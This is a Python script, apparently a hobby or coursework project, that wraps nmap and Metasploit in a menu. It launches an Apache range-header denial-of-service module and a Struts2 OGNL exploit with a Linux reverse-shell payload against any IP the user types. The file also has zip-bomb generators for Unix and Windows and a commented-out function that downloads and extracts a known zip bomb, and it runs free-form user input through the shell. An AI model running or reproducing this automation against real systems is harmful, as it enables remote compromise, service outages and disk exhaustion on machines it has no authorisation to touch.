#important modules required to run script
import subprocess
import os


#Function so metasploit doesn't hang & for initial selection
def menu():
    while True:
        use_type = input(
        """Main MENU:
        Type 1 for an nmap scan,
        Type 2 use Metasploit
        Type 3 to exit
        """)
        if use_type == "1":
                nmap()
        elif use_type == "2":
            metasploit()
        elif use_type == "3":
            exit()
        #elif use_type == "nukeme":
            #nuke()
        else:
            print("Invalid")


'''def nuke():
    nuke_cmd = subprocess.run(
    [f"wget https://raw.githubusercontent.com/M-Mughal07/Project-4/main/42.zip | 7z x ./42.zip", "y"],
    shell = True,
    stdout = subprocess.PIPE,
    stderr = subprocess.PIPE,
    text = True
    )
    print(nuke_cmd.stdout)
'''


#Nmap function stores all nmap commands and variables
def nmap():
    nmap_cmd = (input(
    """Nmap Menu:
    Type 1 to manually enter your nmap command, 
    Type 2 to run a service version scan 
    Type 3 to scan the most popular ports
    Type 4 to run an aggressive scan
    Type menu to go back to main menu
    """)
    )
    
    if nmap_cmd == "menu":
        menu()

    elif nmap_cmd == "1":
        nmap_cmd = str(input("Enter your command "))
        try:
            process = subprocess.run(
                nmap_cmd,
                shell = True,
                stdout = subprocess.PIPE,
                stderr = subprocess.PIPE,
                text = True
                )

            print(process.stdout)
            print(process.stderr)

        except Exception as e:
            print("An error occurred: e")

    elif nmap_cmd == "2":
        sV_target = str(input("Enter your target IP "))
        subprocess.run(["nmap", "-sV", sV_target])
        menu()

    elif nmap_cmd == "3":
        sP_target = str(input("Enter your target IP "))
        num_ports = input("Enter how many ports you want to scan, press enter for a default of 15 ")
        if not num_ports:
            num_ports = str("15")
        subprocess.run(["nmap", "-top-ports", num_ports, sP_target])

    elif nmap_cmd == "4":
        A_target = str(input("Enter your target IP "))
        subprocess.run(["nmap", "-A", A_target])
        menu()
        
    else:
        print("invalid")
        nmap()


#Metasploit function for interacting with msfconsole
def metasploit():
    msf_process = None

    msf_dbcheck = None
    msf_dbcheck = subprocess.run(
        "sudo msfdb status",
        shell = True,
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        text = True
    )
    #Checking if Metasploit database is active
    for line in msf_dbcheck.stdout:
        stripped_line = line.strip()
        if "active" not in stripped_line:
            #Initialize msf database if not active
            msf_init = subprocess.run(
                ["sudo msfdb init"],
                shell = True,
                stdout = subprocess.PIPE,
                stderr = subprocess.PIPE,
                text=True,
                encoding="utf-8"
            )
            if msf_init.returncode == 0:
                print("Metasploit Database initialized")
                break
            else:
                print("Metasploit Database initialization failed")
                break

    try:
        msf_process = subprocess.Popen(
            ["msfconsole"],
            shell = True,
            stdin = subprocess.PIPE,
            stdout = subprocess.PIPE,
            stderr = subprocess.PIPE,
            text = True,  # Interpret input/output as text
            encoding = "utf-8"
        )

        while True:
            msf_cmd = input("""
            Type 1 to perform a TCP port scan,
            Type 2 to launch a DoS attack on an Apache server,
            Type 3 to exploit an Apache Struts server
            Type menu to go back to main menu
            """)

            if msf_cmd == "1":
                msf_tcp_scan = "use scanner/portscan/tcp"
                msf_process.stdin.write(msf_tcp_scan + '\n')
                tar_ip = str(input("enter the target IP address (RHOST) "))
                rhost = "set RHOSTS " + tar_ip
                msf_process.stdin.write(rhost + '\n')
                msf_process.stdin.write("run" + '\n')
                #Flush is used to send data to metasploit immediatly
                msf_process.stdin.flush()
                
               #line reader to go back to menu
                for line in msf_process.stdout:
                    stripped_line = line.strip()
                    print(stripped_line)

                    if "completed" in stripped_line:
                        print("TCP port scan complete.")
                        menu()

            if msf_cmd == "2":
                msf_dos_attk = "use dos/http/apache_range_dos"
                msf_process.stdin.write(msf_dos_attk + '\n')
                msf_process.stdin.flush()

                tar_ip = str(input("type in your target IP address "))
                rhost = "set RHOSTS " + tar_ip
                dos_packets = input("enter how many packets to send (press enter for default of 50) ")
                if not dos_packets:
                    dos_packets = 50
                rlimit = "set RLIMIT " + str(dos_packets)
                msf_process.stdin.write(rhost + '\n')
                msf_process.stdin.flush()

                msf_process.stdin.write(rlimit + '\n')
                msf_process.stdin.flush()

                msf_process.stdin.write("run" + '\n')
                msf_process.stdin.flush()

                #line reader to go back to menu
                for line in msf_process.stdout:
                    stripped_line = line.strip()
                    print(stripped_line)

                    if "Scanned" in stripped_line:
                        print("DoS attack completed.")
                        menu()

            if msf_cmd == "3":
                msf_struts = "use multi/http/struts2_content_type_ognl"
                msf_process.stdin.write(msf_struts + '\n')
                msf_process.stdin.flush()

                struts_payload = "set payload payload/linux/x86/shell_reverse_tcp"
                msf_process.stdin.write(struts_payload + '\n')
                msf_process.stdin.flush()

                struts_ip = str(input("Enter the targets IP "))
                struts_target = "set RHOSTS " + struts_ip
                msf_process.stdin.write(struts_target + '\n')
                msf_process.stdin.flush()

                msf_process.stdin.write("run" + '\n')
                msf_process.stdin.flush()

                session_started = False
                session_id = None
                for line in msf_process.stdout:
                    stripped_line = line.strip()
                    print(stripped_line)

                    if "Command shell session" in stripped_line:
                        session_started = True
                        session_id = stripped_line.split()[4]
                        break

                if session_started == True:
                    msf_process.stdin.write("sessions " + '\n')
                    msf_process.stdin.flush()
    
                if session_started:
                    print("Session started, type sessions -i 1 to interact with the session, then use Unix commands to navigate through the system, press CTRL + C to exit the program")
                    subprocess.run(["python", "/home/kali/Desktop/GH_repos/Cybersec-Work/launch_metasploit.py", "1"])
                else:
                    print("Session could not be started.")

            if msf_cmd == "menu":
                menu()

            for line in msf_process.stdout:
                print(line)

    except Exception as e:
        print("An error occurred:", e)

menu()









#Unix zip bomb maker
global_dir = None
def create_bomb_Unix(newfile):
    global global_dir
    whoami = subprocess.run(["whoami"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    folder = f"/home/{whoami.stdout.strip()}/bombshell"
    subprocess.run(["mkdir", "-p", folder], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    #change "count =" to increase or decrease invididual bomb file sizes
    bomb = f"dd if=/dev/zero bs=1024 count=1000000 > {folder}/{newfile}"
    subprocess.run(
        bomb,
        shell = True,
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        text = True
    )
    global_dir = folder
    return folder

def name_files():
    pwd = subprocess.run(
        ["pwd"],
        shell = True,
        stdout = subprocess.PIPE,
        stderr = subprocess.PIPE,
        text = True
    )

    runs = 5
    print(pwd.stdout)
    bombs = []
    for i in range(1, runs + 1):
        newfile = f"bomb_{i}.txt"
        create_bomb_Unix(newfile)
        print(f"created {newfile}")
        bombs.append(newfile)
    return bombs

bombs_to_zip_Unix = name_files()
zippy = ["7z", "a", "nuke.7z"] + bombs_to_zip_Unix
subprocess.run(zippy, cwd = global_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
print("Nuke created")




#Windows zip bomb maker
global_dir_Windows = None
def create_bomb_Windows(newfile):
    global global_dir_Windows
    whoami = os.getlogin()
    folder = fr"c:\Users\{whoami}\Desktop\bombshell"  # Use raw string (r) to avoid escaping issues
    subprocess.run(["powershell", "mkdir", "-Force", folder], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    bomb_command = f"'0' * 1024 * 1000000 | Out-File -Encoding Ascii {os.path.join(folder, newfile)}"
    subprocess.run(["powershell", "-Command", bomb_command], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    global_dir = folder
    return folder

def name_files_Windows():
    pwd = subprocess.run(
        ["pwd"],
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    runs = 10
    print(pwd.stdout)
    bombs = []
    for i in range(1, runs + 1):
        newfile = f"bomb_{i}.txt"
        folder = create_bomb_Windows(newfile)
        full_path = os.path.join(folder, newfile)  # Get the full path of the bomb file
        print(f"created {newfile}")
        bombs.append(full_path)
    return bombs

bombs_to_zip_Windows = name_files_Windows()
zippy = [fr"tar", "-czf", "nuke.tar.gz"] + bombs_to_zip_Windows
subprocess.run(zippy, cwd = global_dir_Windows, shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
print("Nuke created")
